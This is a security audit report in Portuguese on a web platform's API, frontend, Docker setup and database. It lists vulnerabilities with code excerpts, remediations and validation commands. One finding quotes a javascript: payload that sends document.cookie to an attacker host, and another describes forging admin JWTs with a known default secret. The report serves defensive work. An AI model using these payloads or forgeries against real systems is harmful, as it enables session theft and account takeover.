# AutoLinks — Relatório Completo de Segurança
**Data:** 2026-04-09  
**Versão:** Auditoria Completa (leitura apenas — nenhuma alteração feita)  
**Escopo:** API backend, frontend React, Dockerfiles, docker-compose, banco de dados (RLS/migrations), microserviços (MeLi, Shopee, WhatsApp, Telegram, ops-control), webhooks, extensão Chrome  

---

## Resumo Executivo

| Severidade | Qtd | Maiores Riscos |
|---|---|---|
| **Crítica** | 3 | DB sem verificação de cert TLS, containers root com sessões sensíveis |
| **Alta** | 10 | Account takeover via email change, secret_key exposta em mutações, SSRF via Playwright, Kiwify sem RLS |
| **Média** | 14 | Rate limiters fail-open, erros Postgres retornados ao cliente, token de impersonação em URL |
| **Baixa** | 15 | Senha mínima fraca, PII em audit logs, TOCTOU no salt file |

**Nota sobre sessões anteriores:** As vulnerabilidades identificadas e corrigidas em sessões anteriores (path-to-regexp ReDoS, Vite path traversal, IDOR em rest.ts, XSS no template preview, SSRF no resolveRouteLinkWithRedirect, prototype pollution em parseCookieJson, credenciais cifradas com HKDF) **não foram reintroduzidas** e foram confirmadas como ainda corrigidas.

---

## CRÍTICA

---

### C-1 — Container MeLi-RPA executa como root
**Arquivo:** [docker/meli.Dockerfile](docker/meli.Dockerfile)  
**Categoria:** docker  
**Probabilidade:** Média  

O estágio de runtime usa `mcr.microsoft.com/playwright:v1.58.2-jammy` sem nenhuma diretiva `USER`. O Chromium e o processo Node.js executam como UID 0 (root).

**Impacto técnico:** Uma exploit do Chromium disparada por uma página MercadoLivre maliciosa durante a conversão de link, ou um RCE via `productUrl` forjado, concede root dentro do container. Root-in-container é o pré-requisito padrão para CVEs de container escape (runc, overlay2 race conditions).

**Impacto de negócio:** Comprometimento total do microserviço de MeLi, potencial fuga para o host físico, acesso ao docker socket e a outros containers no mesmo host.

**Remediação:**
```dockerfile
# Antes de CMD no estágio de runtime:
RUN groupadd -r pwuser && useradd -r -g pwuser pwuser \
    && chown -R pwuser:pwuser /app
USER pwuser
```
A imagem da Microsoft inclui `pwuser` exatamente para este uso.

**Validação:** `docker inspect autolinks-meli | grep -i user` deve retornar `"User": "pwuser"`.

---

### C-2 — Container de backup de sessões executa como root
**Arquivo:** [docker/sessions-backup.Dockerfile](docker/sessions-backup.Dockerfile)  
**Categoria:** docker  
**Probabilidade:** Baixa (requer comprometimento do host)  

`FROM alpine:3.19` sem `USER`. O container monta os volumes de sessão do WhatsApp, Telegram e MercadoLivre e executa cron + shell scripts como UID 0.

**Impacto técnico:** Estes volumes contêm os tokens de autenticação de longa duração mais sensíveis do sistema. Root neste container + acesso ao volume = comprometimento de todas as sessões ativas de todos os usuários.

**Impacto de negócio:** Acesso total a todas as contas WhatsApp e Telegram dos usuários da plataforma. Risco de banimento massivo e responsabilidade legal.

**Remediação:**
```dockerfile
RUN addgroup -S backup && adduser -S -G backup backup \
    && chown -R backup:backup /backups
USER backup
```
Garantir que os volumes montados tenham permissões de leitura para o usuário `backup`.

**Validação:** `docker inspect autolinks-sessions-backup | grep -i user` → deve retornar usuário não-root.

---

### C-3 — TLS do banco de dados sem verificação de certificado por padrão
**Arquivo:** [services/api/src/db.ts#L23](services/api/src/db.ts), [docker-compose.coolify.yml](docker-compose.coolify.yml)  
**Categoria:** deploy / transport  
**Probabilidade:** Baixa (requer posição de rede entre API e DB)  

```typescript
// db.ts linha 23
const sslRejectUnauthorized =
  String(process.env.DB_SSL_REJECT_UNAUTHORIZED || "false").toLowerCase() !== "false";
// ↑ padrão: false → rejectUnauthorized = false
```

```yaml
# docker-compose.coolify.yml
DB_SSL_REJECT_UNAUTHORIZED: ${DB_SSL_REJECT_UNAUTHORIZED:-false}
```

Com `rejectUnauthorized: false`, a conexão usa TLS (criptografado) mas **não valida a identidade do servidor**. Um atacante com acesso de rede entre a API e o PostgreSQL pode apresentar qualquer certificado e realizar MITM completo.

**Impacto técnico:** Todo o tráfego entre API e banco pode ser interceptado: credenciais, JWT secrets carregados em memória, todos os dados de usuários, tokens de sessão, segredos Kiwify.

**Impacto de negócio:** Vazamento total do banco de dados. Comprometimento de todos os usuários da plataforma.

**Remediação:**
1. `docker-compose.coolify.yml`: mudar padrão para `${DB_SSL_REJECT_UNAUTHORIZED:-true}`
2. `db.ts`: adicionar `DB_SSL_REJECT_UNAUTHORIZED` à lista de variáveis verificadas em produção — nunca deve ser `"false"` quando `NODE_ENV=production`
3. Provisionar CA bundle correto se usando certificado autoassinado

**Validação:** `openssl s_client -connect <db-host>:5432 -starttls postgres` deve validar a cadeia de certificados.

---

## ALTA

---

### H-1 — SSRF via Playwright: `isMercadoLivreUrl()` usa `.includes()`
**Arquivo:** [services/mercadolivre-rpa/src/server.ts#L15-L27](services/mercadolivre-rpa/src/server.ts)  
**Categoria:** ssrf  
**Probabilidade:** Média (requer WEBHOOK_SECRET válido)  

```typescript
function isMercadoLivreUrl(url: URL): boolean {
  const host = url.hostname.toLowerCase();
  return (
    host === "meli.la" ||
    host.endsWith(".meli.la") ||
    host === "mlb.am" ||
    host.endsWith(".mlb.am") ||
    host.includes("mercadolivre") ||   // ← "evilmercadolivre.com" passa
    host.includes("mercadolibre") ||   // ← "fakemercadolibre.attacker.com" passa
    host.includes("mercadopago") ||
    host.includes("mlstatic")
  );
}
```

Enquanto `session.ts` usa um `Set` de domínios exatos com verificação de sufixo (corretamente hardened em sessão anterior), `server.ts` usa `.includes()`. Um atacante pode submeter `productUrl: "https://evilmercadolivre.com/payload"` ou apontar para serviços internos que contenham essas strings no hostname.

**Impacto técnico:** O browser Playwright navega para URL controlada pelo atacante. Exposição de metadados de rede interna, possível SSRF para serviços internos do Docker.

**Impacto de negócio:** Reconhecimento de infraestrutura interna. Possível pivot para outros microserviços.

**Remediação:** Unificar com o pattern de `session.ts`:
```typescript
const ALLOWED_MELI_HOSTS = new Set([
  "meli.la","mlb.am","mercadolivre.com.br","mercadolibre.com",
  "mercadopago.com.br","mlstatic.com","mercadolivre.com","mercadolibre.com.ar"
]);

function isMercadoLivreUrl(url: URL): boolean {
  const h = url.hostname.toLowerCase().replace(/^www\./, "");
  if (ALLOWED_MELI_HOSTS.has(h)) return true;
  return [...ALLOWED_MELI_HOSTS].some(d => h.endsWith("." + d));
}
```

**Validação:** `curl -X POST /convert-link -d '{"productUrl":"https://evilmercadolivre.com/path"}' -H "x-webhook-secret: ..."` deve retornar 400.

---

### H-2 — Tabelas Kiwify sem RLS (4 tabelas)
**Arquivo:** [supabase/migrations/20260406000000_kiwify_integration.sql](supabase/migrations/20260406000000_kiwify_integration.sql) (e migrations `000001`–`000004`)  
**Categoria:** authz / db  
**Probabilidade:** Alta (qualquer usuário autenticado via PostgREST)  

O loop `ENABLE ROW LEVEL SECURITY` da migration `021_supabase_rls_policies.sql` foi escrito antes das tabelas Kiwify existirem e não as inclui. Nenhuma das 5 migrations Kiwify subsequentes adiciona `ENABLE ROW LEVEL SECURITY` ou `CREATE POLICY`.

**Tabelas afetadas:** `kiwify_config`, `kiwify_transactions`, `kiwify_plan_mappings`, `kiwify_webhooks_log`

**Impacto técnico:** Qualquer usuário `authenticated` acessando o PostgREST diretamente pode:
- `SELECT * FROM kiwify_config` → `client_secret`, `webhook_secret`, `oauth_token_cache`
- `SELECT * FROM kiwify_transactions` → `customer_email`, `customer_name` de **todos** os clientes
- `SELECT * FROM kiwify_webhooks_log` → histórico completo de eventos de pagamento

**Impacto de negócio:** Vazamento de PII de clientes pagantes, credenciais OAuth Kiwify, histórico financeiro completo.

**Remediação:** Nova migration:
```sql
ALTER TABLE kiwify_config ENABLE ROW LEVEL SECURITY;
ALTER TABLE kiwify_config FORCE ROW LEVEL SECURITY;
CREATE POLICY kiwify_config_admin_only ON kiwify_config
  FOR ALL TO authenticated USING (app_is_admin());

ALTER TABLE kiwify_transactions ENABLE ROW LEVEL SECURITY;
ALTER TABLE kiwify_transactions FORCE ROW LEVEL SECURITY;
CREATE POLICY kiwify_tx_read ON kiwify_transactions
  FOR SELECT TO authenticated
  USING (user_id = app_current_user_id() OR app_is_admin());
CREATE POLICY kiwify_tx_insert_svc ON kiwify_transactions
  FOR INSERT TO service_role WITH CHECK (true);

-- Repetir para kiwify_plan_mappings (admin only) e kiwify_webhooks_log (admin only)
```

**Validação:** `psql -c "SELECT * FROM kiwify_config" --auth-user=<user_uuid>` deve retornar erro de RLS.

---

### H-3 — Backups de sessão desencriptados por padrão
**Arquivo:** [docker-compose.coolify.yml](docker-compose.coolify.yml), [docker/sessions-backup-entrypoint.sh](docker/sessions-backup-entrypoint.sh)  
**Categoria:** secrets / storage  
**Probabilidade:** Alta (basta o operador não configurar a variável)  

```yaml
BACKUP_ENCRYPTION_KEY: ${BACKUP_ENCRYPTION_KEY:-}   # padrão: vazio
```

Sem a chave definida, os arquivos `.tar.gz` são gerados sem criptografia. O volume `sessions_backups` é um volume Docker nomeado — se o host for comprometido ou o volume montado por outro container, todos os tokens de sessão WA/TG/MeLi são expostos.

**Impacto de negócio:** Comprometimento de todas as sessões ativas dos usuários. Risco de banimento de contas.

**Remediação:**
```sh
# sessions-backup-entrypoint.sh — início do script
if [ -z "${BACKUP_ENCRYPTION_KEY}" ]; then
  echo "[sessions-backup] FATAL: BACKUP_ENCRYPTION_KEY is required. Exiting." >&2
  exit 1
fi
```

**Validação:** Container falha ao iniciar se `BACKUP_ENCRYPTION_KEY` não estiver definido.

---

### H-4 — Troca de e-mail sem verificação de senha atual
**Arquivo:** [services/api/src/auth.ts#L1258-L1281](services/api/src/auth.ts)  
**Categoria:** auth / account-takeover  
**Probabilidade:** Alta  

A troca de **senha** exige `current_password`. A troca de **e-mail** não exige nada além de um JWT válido (cookie `autolinks_at`):

```typescript
// auth.ts ~L1258
if (email !== undefined) {
  // ← sem verificação de current_password
  // ← sem token_invalidated_before
  // ← sem envio de verificação para novo e-mail
  await execute("UPDATE users SET email = $1, updated_at = NOW() WHERE id = $2", [normalizedEmail, userId]);
  await execute("UPDATE profiles SET email = $1, updated_at = NOW() WHERE user_id = $2", [normalizedEmail, userId]);
}
```

**Cadeia de ataque:** cookie roubado (XSS, rede Wi-Fi, acesso físico) → mudar e-mail para endereço do atacante → disparar "esqueci a senha" → link de reset vai para o atacante → conta completamente comprometida sem precisar saber a senha original.

**Impacto de negócio:** Account takeover silencioso de qualquer usuário cujo cookie de sessão seja obtido.

**Remediação:**
1. Exigir `current_password` para troca de e-mail (mesma lógica de troca de senha)
2. Definir `email_confirmed_at = NULL` no `users` e enviar verificação para o novo e-mail
3. Enviar notificação de segurança para o e-mail **anterior**
4. Definir `token_invalidated_before = NOW()` para invalidar todas as sessões ativas

**Validação:** Tentar `PATCH /auth/update-user` com `{ email: "attacker@x.com" }` sem `current_password` deve retornar 400.

---

### H-5 — `secret_key` retornada em plaintext em INSERT/UPDATE/UPSERT
**Arquivo:** [services/api/src/rest.ts#L432](services/api/src/rest.ts), [rest.ts#L494](services/api/src/rest.ts)  
**Categoria:** secrets / authz  
**Probabilidade:** Alta  

```typescript
// SELECT — ✅ correto
decryptRows(table, rows);
maskSensitiveColumns(table, rows);   // ← mascaramento aplicado
res.json({ data: rows });

// INSERT — ❌ vulnerable
decryptRows(table, inserted);
res.json({ data: ret });             // ← maskSensitiveColumns AUSENTE

// UPDATE — ❌ vulnerable
decryptRows(table, result.rows);
res.json({ data: result.rows });     // ← maskSensitiveColumns AUSENTE
```

`SENSITIVE_MASKED_COLUMNS` marca `api_credentials.secret_key` como nunca retornável ao cliente. A proteção funciona no SELECT mas qualquer operação de mutação (incluindo um UPDATE trivial como mudar apenas o campo `name`) retorna `RETURNING *` decriptado + não mascarado.

**Impacto de negócio:** Chaves de API de terceiros (Shopee, Amazon, etc.) dos usuários são expostas em toda operação de INSERT/UPDATE/UPSERT sobre `api_credentials`.

**Remediação:** Aplicar `maskSensitiveColumns(table, rows)` após cada `decryptRows()` em INSERT, UPDATE, UPSERT e DELETE com RETURNING:
```typescript
// rest.ts — após cada decryptRows():
decryptRows(table, inserted as Record<string, unknown>[]);
maskSensitiveColumns(table, inserted as Record<string, unknown>[]);  // ← adicionar
res.json({ data: ret, count: inserted.length, error: null });
```

**Validação:** `op: "update"` em `api_credentials` mudando apenas `name` não deve retornar `secret_key` no response.

---

### H-6 — JWT `changeme` fallback em ambientes não-produção acessíveis externamente
**Arquivo:** [services/api/src/auth.ts#L14-L22](services/api/src/auth.ts)  
**Categoria:** auth  
**Probabilidade:** Média  

```typescript
const SECRET = (() => {
  const s = process.env.JWT_SECRET;
  if (!s || s === "changeme-jwt-secret-32chars-minimum") {
    if (process.env.NODE_ENV === "production") throw new Error("...");
    return "changeme-jwt-secret-32chars-minimum";  // segredo público conhecido
  }
  return s;
})();
```

Qualquer deploy staging/preview/review com `NODE_ENV` diferente de `"production"` mas acessível pela internet aceita JWTs forjados com o secret literal `"changeme-jwt-secret-32chars-minimum"`.

**Impacto técnico:** Forja de token admin: `{ sub: "<user-uuid>", role: "admin" }` — acesso total ao painel administrativo.

**Remediação:** Em `ensureRequiredEnvVars()`, adicionar verificação independente do `NODE_ENV`:
```typescript
if (!process.env.JWT_SECRET || process.env.JWT_SECRET === "changeme-jwt-secret-32chars-minimum") {
  if (process.env.ALLOW_INSECURE_DEFAULTS !== "true") {
    throw new Error("JWT_SECRET must be set to a strong random value");
  }
}
```
`ALLOW_INSECURE_DEFAULTS=true` só deve ser aceito em ambientes locais sem acesso externo.

**Validação:** Deploy de staging sem `JWT_SECRET` definido deve falhar na inicialização ou rejeitar tokens forjados.

---

### H-7 — Token do webhook Kiwify exposto em query string (logs)
**Arquivo:** [services/api/src/index.ts#L475](services/api/src/index.ts)  
**Categoria:** secrets  
**Probabilidade:** Alta  

```typescript
const webhookToken = String(
  payload.token ??
  payload.webhook_token ??
  req.query?.["token"] ??             // ← token na URL
  req.headers["x-kiwify-webhook-token"] ??
  ""
).trim();
```

A URL `POST /webhooks/kiwify?token=<webhook_secret>` fica gravada em todos os access logs de Nginx, Coolify, Cloudflare e qualquer proxy intermediário. O `webhook_secret` em texto claro nos logs permite que qualquer pessoa com acesso aos logs forje webhooks de pagamento.

**Impacto de negócio:** Forja de eventos de pagamento Kiwify → ativação fake de planos sem pagamento real.

**Remediação:**
```typescript
const webhookToken = String(
  payload.token ??
  payload.webhook_token ??
  // req.query?.["token"] ??  ← remover esta linha
  req.headers["x-kiwify-webhook-token"] ??
  ""
).trim();
```

**Validação:** Webhook enviado com `?token=...` deve retornar 401 após a correção.

---

### H-8 — Token de impersonação exposto em URL (AdminUsers)
**Arquivo:** [src/pages/admin/AdminUsers.tsx#L795](src/pages/admin/AdminUsers.tsx)  
**Categoria:** auth / secrets  
**Probabilidade:** Baixa-média  

```typescript
window.open(`/?impersonate_token=${res.token}`, "_blank", "noopener,noreferrer");
```

O token de impersonação ficará no histórico do navegador do admin, nos logs de acesso do servidor, e no cabeçalho `Referer` de qualquer clique externo feito na aba aberta.

**Remediação:** O backend deve consumir o token e emitir um cookie `HttpOnly` diretamente via redirect server-side, ou usar uma sessão de curta duração com troca via POST:
```typescript
// Opção: o backend redireciona com Set-Cookie, não expõe token na URL
window.open(`/api/admin/impersonate-redirect?user_id=${user.user_id}`, "_blank", "noopener,noreferrer");
```
*(O endpoint verifica a sessão do admin, emite o cookie e redireciona para `/dashboard`.)*

---

### H-9 — Open Redirect sem validação de protocolo (MasterGroupPublicPage)
**Arquivo:** [src/pages/MasterGroupPublicPage.tsx#L40](src/pages/MasterGroupPublicPage.tsx)  
**Categoria:** open-redirect  
**Probabilidade:** Média (requer inserção maliciosa no banco ou comprometimento do backend)  

```typescript
const target = data?.redirectUrl;
if (!target) return;
window.location.replace(target);  // ← sem validação de protocolo
```

Se o banco retornar `redirectUrl: "javascript:fetch('https://attacker.com/?c='+document.cookie)"`, o código JS executa no contexto da aplicação.

**Remediação:**
```typescript
const target = data?.redirectUrl;
if (!target) return;
try {
  const parsed = new URL(target);
  if (parsed.protocol !== "https:" && parsed.protocol !== "http:") return;
  window.location.replace(target);
} catch { /* URL inválida */ }
```

---

### H-10 — Stored XSS / Open Redirect em página pública de LinkHub
**Arquivo:** [src/pages/LinkHubPublicPage.tsx#L89](src/pages/LinkHubPublicPage.tsx)  
**Categoria:** xss / open-redirect  
**Probabilidade:** Média  

```typescript
function getInviteLink(group: LinkHubGroup) {
  if (group.redirect_url) return group.redirect_url;                           // ← sem validação
  if (group.invite_link && /^https?:\/\//i.test(group.invite_link)) return group.invite_link;  // ← com validação
```

`redirect_url` é retornado sem qualquer filtro de protocolo, enquanto `invite_link` exige `https?://`. Um admin com conta comprometida pode configurar `redirect_url = "javascript:..."` — e como esta é uma **página pública** (acessível sem login), o XSS atinge qualquer visitante.

**Remediação:**
```typescript
function getInviteLink(group: LinkHubGroup) {
  if (group.redirect_url && /^https?:\/\//i.test(group.redirect_url)) return group.redirect_url;
  if (group.invite_link && /^https?:\/\//i.test(group.invite_link)) return group.invite_link;
```

---

## MÉDIA

---

### M-1 — Troca de e-mail não invalida sessões existentes
**Arquivo:** [services/api/src/auth.ts#L1274](services/api/src/auth.ts)  
**Categoria:** session  

Após mudar o e-mail, `token_invalidated_before` não é atualizado. Todas as sessões JWT ativas permanecem válidas. A troca de senha inválidada corretamente — a troca de e-mail não. Ver H-4 para a cadeia completa.

**Remediação:** Adicionar `token_invalidated_before = NOW()` no UPDATE de troca de e-mail.

---

### M-2 — Novo e-mail não passa por re-verificação
**Arquivo:** [services/api/src/auth.ts#L1274](services/api/src/auth.ts)  
**Categoria:** auth  

Uma conta pode ser transferida para qualquer e-mail sem confirmação. Permite apontar o e-mail para uma vítima e então disparar password-reset para esse endereço.

**Remediação:** `email_confirmed_at = NULL` após o UPDATE; enviar verificação para o novo e-mail; notificação para o e-mail antigo.

---

### M-3 — Mensagens de erro raw do PostgreSQL retornadas ao cliente
**Arquivo:** [services/api/src/rest.ts#L598](services/api/src/rest.ts)  
**Categoria:** outro (information disclosure)  

```typescript
} catch (e: unknown) {
  const msg = e instanceof Error ? e.message : String(e);
  res.json({ data: null, error: { message: msg } });
}
```

Erros do PostgreSQL contêm nomes de colunas, tabelas, constraints e às vezes fragmentos de query. Reconhecimento de schema via payload malformado é trivial.

**Remediação:** Capturar `pg.DatabaseError` separadamente, logar o detalhe server-side, retornar apenas `"Erro ao executar operação"` ao cliente. Mapear códigos de erro conhecidos (23505, 23503) para mensagens de usuário seguros.

---

### M-4 — `onConflict` não validado contra schema da tabela
**Arquivo:** [services/api/src/rest.ts#L516](services/api/src/rest.ts)  
**Categoria:** outro (information disclosure)  

`safeIdent()` valida apenas o formato do identificador (sem injeção). Não verifica se a coluna existe ou se tem constraint UNIQUE. Um valor inválido causa erro do PostgreSQL com o nome da tabela, que é retornado ao cliente via M-3.

**Remediação:** Manter um mapa `onConflict` allowlist por tabela (similar a `TABLE_ENUM_CONSTRAINTS`). Retornar 400 com mensagem genérica para coluna fora do allowlist.

---

### M-5 — Todos os rate limiters falham abertos (fail-open) sob indisponibilidade do DB
**Arquivo:** [services/api/src/index.ts#L142](services/api/src/index.ts)  
**Categoria:** ddos-rate-limit  

```typescript
} catch {
  next();  // ← fail-open quando DB indisponível
}
```

Todos os 4 rate limiters (`authRateLimiter`, `rpcRateLimiter`, `publicRpcRateLimiter`, `userRpcRateLimiter`) chamam `next()` em exceção. Um atacante que consegue saturar o pool de DB desabilita toda proteção de brute-force como pré-condição para credential stuffing.

**Remediação:** Para endpoints de autenticação especificamente, falhar **fechado** durante indisponibilidade do store. Adicionar circuit breaker com in-memory fallback de emergência.

---

### M-6 — Salt do credential-cipher não durável em containers
**Arquivo:** [services/api/src/credential-cipher.ts#L43](services/api/src/credential-cipher.ts)  
**Categoria:** secrets / storage  

```typescript
const saltFile = join(process.cwd(), ".credential-cipher-salt");
if (!existsSync(saltFile)) {
  const s = randomBytes(32);
  writeFileSync(saltFile, s.toString("hex"), { mode: 0o600 });
}
```

Salt armazenado no CWD do container. Substituição do container sem volume persistente gera novo salt → nova chave AES → todas as credenciais previamente encriptadas ficam irrecuperáveis silenciosamente.

**Remediação:** Mover para variável de ambiente `CREDENTIAL_CIPHER_SALT` (gerada uma vez na instalação e armazenada no secrets manager do Coolify). Remover o fallback de arquivo.

---

### M-7 — Tentativas de login falhas não registradas em `admin_audit_logs`
**Arquivo:** [services/api/src/auth.ts](services/api/src/auth.ts)  
**Categoria:** audit  

Falhas de autenticação são logadas apenas em `console.log` (visível em logs de container), mas **não** na tabela `admin_audit_logs` que alimenta o painel de segurança do administrador. Ataques de brute-force contra contas específicas são invisíveis para o admin.

**Remediação:** Chamar `logAudit({ action: "session.failed", ... })` em todas as falhas de autenticação.

---

### M-8 — Sem rate limiting por destinatário de e-mail
**Arquivo:** [services/api/src/mailer.ts](services/api/src/mailer.ts), [services/api/src/auth.ts](services/api/src/auth.ts)  
**Categoria:** abuse / ddos-rate-limit  

O rate limiter é por IP. Um atacante com múltiplos IPs pode disparar dezenas de e-mails de verificação/reset para o mesmo endereço (harassment) ou gerar custo de envio em escala.

**Remediação:** Implementar cooldown por e-mail (ex: máx 3 e-mails por endereço por hora) na tabela `runtime_rate_limits`.

---

### M-9 — Oracle de comprimento de token no ops-control
**Arquivo:** [services/ops-control/src/server.mjs](services/ops-control/src/server.mjs)  
**Categoria:** auth  

```javascript
if (tokenBuf.length === 0 || tokenBuf.length !== expectedBuf.length) return false;
return timingSafeEqual(tokenBuf, expectedBuf);
```

A saída antecipada em comprimento diferente vaza o tamanho exato de `OPS_CONTROL_TOKEN` via timing. Os outros microserviços usam HMAC (tamanho fixo) antes do `timingSafeEqual`.

**Remediação:**
```javascript
const ha = createHmac("sha256", "ops").update(provided).digest();
const hb = createHmac("sha256", "ops").update(expected).digest();
return timingSafeEqual(ha, hb);
```

---

### M-10 — PII em `kiwify_transactions` sem política de retenção
**Arquivo:** [supabase/migrations/20260406000000_kiwify_integration.sql](supabase/migrations/20260406000000_kiwify_integration.sql)  
**Categoria:** data-secrets  

`customer_email` e `customer_name` armazenados sem TTL, trigger de deleção ou column-level masking. CPF já mascarado (correto). E-mail e nome constituem PII sob LGPD.

**Remediação:** Coluna `retain_until TIMESTAMPTZ`; job de limpeza que nulifica os campos PII após a janela de retenção.

---

### M-11 — `ADMIN_PASSWORD` visível como env var no container
**Arquivo:** [docker-compose.coolify.yml](docker-compose.coolify.yml)  
**Categoria:** secrets  

Env vars são visíveis via `docker inspect` e `/proc/<pid>/environ`. O ops-control expõe informações de processo — um endpoint secundário de leitura de `/proc` completaria o ataque.

**Remediação:** Usar Docker Secrets ou arquivo montado. Ler de `/run/secrets/admin_password` no código.

---

### M-12 — Bridge token da extensão exposto via PING sem autenticação
**Arquivo:** [src/pages/mercadolivre/MercadoLivreConfiguracoes.tsx#L328](src/pages/mercadolivre/MercadoLivreConfiguracoes.tsx)  
**Categoria:** desktop-extension  

Qualquer JS na mesma page pode enviar `{ type: "AUTOLINKS_PING" }` via `postMessage` e receber o `bridgeToken` em resposta, sem precisar conhecê-lo previamente. Com o token, pode disparar `AUTOLINKS_EXTENSION_LOGIN` ou `AUTOLINKS_PUSH_COOKIES`. Amplifica qualquer outro XSS na mesma origem.

**Remediação:** PING deve exigir que o remetente já possua o token (ou usar um channel de bootstrap separado). Alternativamente, o token pode ser gerado per-page e expirar a cada reload.

---

### M-13 — `kiwifyCheckoutUrl` em href/window.open sem validação de protocolo
**Arquivo:** [src/pages/Configuracoes.tsx#L542](src/pages/Configuracoes.tsx), [Configuracoes.tsx#L828](src/pages/Configuracoes.tsx)  
**Categoria:** xss  

`new URL("javascript:alert(1)")` é válido. O resultado é colocado em `href` e em `window.open`. O React ≥17 bloqueia `javascript:` em `href`, mas o fallback `window.open(checkoutUrl, ...)` não tem proteção.

**Remediação:**
```typescript
const parsed = new URL(checkoutUrl);
if (parsed.protocol !== "https:") return;
window.open(checkoutUrl, "_blank", "noopener,noreferrer");
```

---

### M-14 — Affiliate link da Shopee em `window.open` sem validação de protocolo
**Arquivo:** [src/components/shopee/ProductCard.tsx#L66](src/components/shopee/ProductCard.tsx)  
**Categoria:** xss / open-redirect  

```typescript
window.open(product.affiliateLink, "_blank", "noopener,noreferrer");
```

`affiliateLink` vem da API. Se o backend retornar um valor com `javascript:`, o `noopener` não impede a execução — apenas impede acesso ao `window.opener`.

**Remediação:** Validar `affiliateLink` com `new URL()` + verificação de protocolo `https?:` antes de passar para `window.open`.

---

## BAIXA

---

### L-1 — `LOG_HASH_SALT` com fallback estático público
**Arquivo:** [services/api/src/index.ts#L29](services/api/src/index.ts)  
```typescript
const LOG_HASH_SALT = String(process.env.LOG_HASH_SALT || "autolinks-log-salt-v2").trim() || "autolinks-log-salt-v2";
```
O salt `"autolinks-log-salt-v2"` é texto estático e público (fonte aberta). Permite pré-computar mapa de IDs → hashes de log, de-anonimizando usuários nos logs. Aplicável apenas se logs de múltiplos ambientes forem agregados.

---

### L-2 — E-mail do admin logado em plaintext no boot
**Arquivo:** [services/api/src/index.ts](services/api/src/index.ts)  
```typescript
console.log(`[api] Admin user seeded: ${adminEmail}`);
```
E-mail da conta admin aparece em plaintext nos logs de inicialização e pode ser capturado por sistemas de log centralizados.

---

### L-3 — `ENFORCE_RATE_LIMIT=false` não bloqueado em produção
**Arquivo:** [services/api/src/index.ts](services/api/src/index.ts)  
`ensureRequiredEnvVars()` não verifica se `ENFORCE_RATE_LIMIT` é `false` em produção. Deploy misconfigured remove toda proteção anti-brute-force silenciosamente.

---

### L-4 — Atualizações multi-step não transacionais em auth.ts
**Arquivo:** [services/api/src/auth.ts](services/api/src/auth.ts)  
Múltiplas chamadas `execute()` (senha, e-mail, telefone, metadados) não estão em uma transação. Falha parcial pode deixar o estado em inconsistência.

---

### L-5 — Sessão emitida imediatamente após consumo do token de reset de senha
**Arquivo:** [services/api/src/auth.ts](services/api/src/auth.ts)  
```typescript
const session = issueSessionForCookie(res, user);
res.json({ data: { user: session.user, session } });
```
Token interceptado concede sessão completa, não apenas fluxo de troca de senha. Preferível redirecionar para login após reset.

---

### L-6 — Política de senha fraca (mínimo 8 chars, sem verificação de breach)
**Arquivo:** [services/api/src/password-policy.ts](services/api/src/password-policy.ts)  
`password1` passa. Sem verificação contra HaveIBeenPwned, sem lista de senhas comuns. ASVS 5.0 L2 recomenda mínimo de 12 caracteres.

---

### L-7 — Slow query logger expõe SQL (até 200 chars) nos logs
**Arquivo:** [services/api/src/db.ts](services/api/src/db.ts)  
Templates de query (com nomes de tabelas/colunas) aparecem nos logs do servidor. Relevante se logs centralizados forem comprometidos.

---

### L-8 — User-agent armazenado raw em `admin_audit_logs` (potencial stored XSS)
**Arquivo:** [services/api/src/audit.ts](services/api/src/audit.ts)  
```typescript
entry.user_agent ?? null,  // direto de req.headers["user-agent"]
```
Se o painel admin renderizar user-agents sem escape HTML, qualquer usuário pode injetar HTML/JS nos logs do admin simplesmente fazendo requests com user-agent malicioso.

---

### L-9 — PII em plaintext no `details` de audit log de signup
**Arquivo:** [services/api/src/auth.ts](services/api/src/auth.ts)  
```typescript
details: { email: normalizedEmail, name, plan_id: signupPlanId, phone },
```
E-mail e telefone completos armazenados em `admin_audit_logs.details` (JSONB). Sob LGPD, sujeito à minimização de dados e direito de apagamento.

---

### L-10 — TOCTOU na criação do arquivo de salt do credential-cipher
**Arquivo:** [services/api/src/credential-cipher.ts#L43](services/api/src/credential-cipher.ts)  
```typescript
if (!existsSync(saltFile)) {    // check
  writeFileSync(saltFile, ...); // create
}
```
Dois workers PM2 iniciando simultaneamente podem ambos ver o arquivo ausente, gerar salts diferentes e um sobrescrever o outro. Usar `openSync` com `O_CREAT | O_EXCL`.

---

### L-11 — Store in-memory de rate limiting sem limite máximo de entradas
**Arquivo:** [services/api/src/rate-limit-store.ts](services/api/src/rate-limit-store.ts)  
Em dev (backend de memória), o Map cresce indefinidamente até o cleanup de 5 minutos. Ataque de rotação de IP pode consumir memória ilimitada.

---

### L-12 — Side-channel de timing no endpoint `resend-verification`
**Arquivo:** [services/api/src/auth.ts](services/api/src/auth.ts)  
Usuário não cadastrado → resposta imediata. Usuário não confirmado → bcrypt + envio de e-mail. A diferença de tempo confirma a existência de uma conta não verificada para dado e-mail.

---

### L-13 — Chave de encriptação de backup em path previsível
**Arquivo:** [docker/sessions-backup-entrypoint.sh](docker/sessions-backup-entrypoint.sh)  
```sh
KEY_FILE="/run-backup.key"
```
Combinado com C-2 (root), trivialmente legível por qualquer processo no container.

---

### L-14 — Interpolação de shell em `killByPort` no ops-control
**Arquivo:** [services/ops-control/src/server.mjs](services/ops-control/src/server.mjs)  
```javascript
execFileAsync("sh", ["-lc", `lsof -ti tcp:${port}`])
```
`port` está validado como inteiro — não explorável agora. Mas o padrão com template string + shell é frágil. Usar `execFileAsync("lsof", ["-ti", `tcp:${port}`])`.

---

### L-15 — ops-control e scheduler sem multi-stage build
**Arquivo:** [docker/ops-control.Dockerfile](docker/ops-control.Dockerfile), [docker/scheduler.Dockerfile](docker/scheduler.Dockerfile)  
Single-stage builds que copiam source tree completa. Risco de incluir `.env` ou arquivos de dev na imagem de produção.

---

## Confirmado Correto (Auditoria Prévia Verificada)

| Controle | Status |
|---|---|
| IDOR em rest.ts — `user_id` injetado em todos os WHERE | ✅ Correto |
| Admin RPC — `effectiveAdmin` em todas as ~15 funções admin | ✅ Correto |
| CSRF — `requireTrustedOriginForSessionWrite` em /api/rest, /rpc, /auth | ✅ Correto |
| Cookie — `HttpOnly + SameSite=Strict + Secure` em prod | ✅ Correto |
| `user_roles` — trigger bloqueia auto-elevação para admin | ✅ Correto |
| JWT — assinado server-side, role vem de `user_roles` no sign-in | ✅ Correto |
| Webhook HMAC — `timingSafeEqual` em Kiwify e WA | ✅ Correto |
